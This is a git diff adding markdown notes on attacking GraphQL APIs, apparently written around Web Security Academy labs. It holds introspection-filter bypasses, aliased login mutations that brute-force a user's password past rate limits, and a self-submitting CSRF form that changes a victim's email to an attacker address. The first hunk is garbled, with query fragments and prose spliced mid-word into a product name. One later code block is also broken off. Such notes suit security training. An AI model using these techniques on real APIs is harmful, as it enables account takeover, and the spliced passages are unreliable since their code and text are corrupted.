@@ -186,7 +186,89 @@ Fragments are pre-defined parts of queries which can be used in multiple queries
         "data": {
             "getProduct": {
                 "id": 1,
-                "name": "Juice Extractor",
+                "name": "Juice Extracquery       qu  ery Introspecti onQuery {  
+    __schema {
+        queryType {
+            name  
+        }
+        mutationType {
+            name
+        }
+        subscriptionType {
+            name
+        }
+        types {
+         ...FullType
+        }
+        directives {
+            name
+            description
+            args {
+                ...InputValue
+        }
+        }
+    }
+}
+
+fragment FullType on __Type {
+    kind
+    name
+    description
+    fields(includeDeprecated: true) {
+        name
+        description
+        args {
+            ...InputValue
+        }
+        type {
+            ...TypeRef
+        }
+        isDeprecated
+        deprecationReason
+    }
+    inputFields {
+        ...InputValue
+    }
+    interfaces {
+        ...TypeRef
+    }
+    enumValues(includeDeprecated: true) {
+        name
+        description
+        isDeprecated
+        deprecationReason
+    }
+    possibleTypes {
+        ...TypeRef
+    }
+}
+
+fragment InputValue on __InputValue {
+    name
+    description
+    type {
+        ...TypeRef
+    }
+    defaultValue
+}
+
+fragment TypeRef on __Type {
+    kindschema
+        {queryType{name}}}"
+    }
+```
+If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+            }
+        }
+    }
+}tor",
                 "listed": "no",
                 "stock": 5
             }
@@ -222,4 +304,195 @@ We must investigate requests and try to change them to detect e.g. IDOR vulns. F
             listed
         }
     }
+```
+## Discovering schema information
+### Introspection
+If introspection is enabled, the response returns the names of all available queries.  
+```
+ #Introspection probe request
+
+{
+    "query": "{__schema{queryType{name}}}"
+}
+```
+```
+#Full introspection query
+
+    query IntrospectionQuery {
+        __schema {
+            queryType {
+                name
+            }
+            mutationType {
+                name
+            }
+            subscriptionType {
+                name
+            }
+            types {
+             ...FullType
+            }
+            directives {
+                name
+                description
+                args {
+                    ...InputValue
+            }
+            onOperation  #Often needs to be deleted to run query
+            onFragment   #Often needs to be deleted to run query
+            onField      #Often needs to be deleted to run query
+            }
+        }
+    }
+
+    fragment FullType on __Type {
+        kind
+        name
+        description
+        fields(includeDeprecated: true) {
+            name
+            description
+            args {
+                ...InputValue
+            }
+            type {
+                ...TypeRef
+            }
+            isDeprecated
+            deprecationReason
+        }
+        inputFields {
+            ...InputValue
+        }
+        interfaces {
+            ...TypeRef
+        }
+        enumValues(includeDeprecated: true) {
+            name
+            description
+            isDeprecated
+            deprecationReason
+        }
+        possibleTypes {
+            ...TypeRef
+        }
+    }
+
+    fragment InputValue on __InputValue {
+        name
+        description
+        type {
+            ...TypeRef
+        }
+        defaultValue
+    }
+
+    fragment TypeRef on __Type {
+        kind
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+                ofType {
+                    kind
+                    name
+                }
+            }
+        }
+    }
+
+```
+If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure.  
+We can use GQL visualizer to make data received from introspection more readable [link](http://nathanrandal.com/graphql-visualizer/)  
+### Suggestions
+Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.  
+Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).  
+This [tool](https://github.com/nikitastupin/clairvoyance) is helpful to obtain GQL schema  
+Also use `InQL` Burp extension  
+
+## Bypassing GQL introspection defences
+If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.  
+When developers disable introspection, they could use a regex to exclude the __schema keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.  
+```
+#Introspection query with newline
+
+    {
+        "query": "query{__POST of x-www-form-urlencoded.  
+```
+ # Introspection probe as GET request
+
+    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+
+```
+Full introspection query via GET request bypassing __schema filter:
+```
+/api?query={__schema%0a{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}
+```
+## Bypassing rate limiting using aliases 
+Ordinarily, GraphQL objects can't contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.  
+```
+#Request with aliased queries
+
+    query isValidDiscount($code: Int) {
+        isvalidDiscount(code:$code){
+            valid
+        }
+        isValidDiscount2:isValidDiscount(code:$code){
+            valid
+        }
+        isValidDiscount3:isValidDiscount(code:$code){
+            valid
+        }
+    }
+
+```
+```
+mutation login {
+    login(input:{username:"carlos",password:"123456"}) {
+        token
+        success
+    }
+    login2:login(input:{username:"carlos",password:"password"}) {
+        token
+        success
+    }
+    login3:login(input:{username:"carlos",password:"12345678"}) {
+        token
+        success
+    }
+    login4:login(input:{username:"carlos",password:"qwerty"}) {
+        token
+        success
+    }
+    login5:login(input:{username:"carlos",password:"123456789"}) {
+        token
+        success
+    }
+}
+```
+## GraphQL CSRF 
+CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.  
+POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.  
+However, alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.  
+Example of CSRF attack that must be delivered to victim:
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GraphQL CSRF PoC</title>
+</head>
+<body>
+  <form class='login-form' name='email-change-form' action='https://0ae5002d0473912d81e866ed00520053.web-security-academy.net/graphql/v1' method="post">
+    <input type='text' name='query' value='mutation{changeEmail(input:{email:"pwned@attacker.com"}){email}}' style="display: none;">
+    <button class='button' type='submit' style="display: none;"></button>
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
+
 ```
